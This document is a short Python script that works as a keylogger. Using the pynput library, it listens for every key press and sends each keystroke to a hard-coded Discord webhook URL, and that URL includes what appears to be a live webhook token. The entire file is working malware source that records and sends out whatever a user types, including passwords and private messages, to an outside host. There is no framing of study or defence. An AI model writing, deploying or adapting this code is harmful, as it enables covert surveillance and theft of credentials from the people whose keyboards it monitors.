from pynput import keyboard
import requests

webhook = "https://discordapp.com/api/webhooks/1348134373953765460/jzE3SW25lFsWZjo2AUioUptkndQ7EA2eBC9yvdrh5L2Sdd_-lMmSIi7P9Xq5qF8Z5ZXF"

def keyPressed(key):
    message = {
        "content": str(key)
    }
    requests.post(webhook, message)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join() 
